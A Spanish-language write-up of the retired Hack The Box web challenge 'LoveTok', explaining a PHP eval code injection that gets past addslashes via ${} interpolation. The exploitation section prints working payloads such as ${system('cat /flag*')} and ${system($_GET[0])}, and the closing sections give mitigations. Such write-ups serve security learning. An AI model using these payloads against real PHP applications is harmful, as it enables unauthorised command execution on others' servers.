---
challenge: LoveTok
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, php, code-injection, eval, ssti]
---


# LoveTok — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Un servicio que muestra la fecha en distintos formatos recibe el formato por parámetro y lo mete dentro de un `eval`. El `addslashes` de PHP no escapa `${...}` ni las comillas simples anidadas, así que una **inyección de código PHP** con `${system(...)}` ejecuta comandos.

## Enunciado y superficie

```text
/TimeController?format=r
```

Devuelve la fecha con formato `r`. Cambiar `format` cambia la salida, lo que ya sugiere concatenación dentro de una función de fecha.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

El controlador es, en esencia:

```php
class TimeModel {
    public function __construct($format) {
        $this->format = addslashes($format);
        eval("return date('" . $this->format . "');");
    }
}
```

`addslashes` escapa `'`, `"`, `\` y NUL. El payload no usa comillas: usa la **sintaxis `${}`** de PHP, que se interpola dentro de cadenas y evalúa una expresión arbitraria.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

```text
/TimeController?format=${system('cat /flag*')}
```

El `eval` final queda:

```php
return date('${system('cat /flag*')}');
```

`system()` se ejecuta y el valor de retorno de `date()` es irrelevante: la salida del comando ya se ha impreso.

```text
HTB{<flag>}
```

Variantes útiles si el espacio o las comillas se filtran:

```text
${system($_GET[0])}          # y añadir ?0=cat+/flag*
${phpinfo()}
${include('/flag')}
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Comillas simples**: si la app escapa también la barra, `${system($_GET[0])}` evita escribir comillas en el payload.
- **`eval` con `return`**: la expresión debe ser válida dentro de `date('...')`; `${}` funciona porque se resuelve antes de pasar el string.
- **URL encoding**: codificar espacios como `+` o `%20` según el cliente.

- `eval` con entrada del usuario es ejecución remota, aunque el autor crea que solo controla un formato de fecha.
- `addslashes` no es una defensa: hay que usar una allowlist de caracteres de formato (`Y-m-d H:i:s`).
- En PHP, `${}` dentro de cadenas dobles es interpolación con evaluación: noche perfecta para inyección.

## Mitigaciones y detección

- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [ssti](../../knowledge/web/ssti.md)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
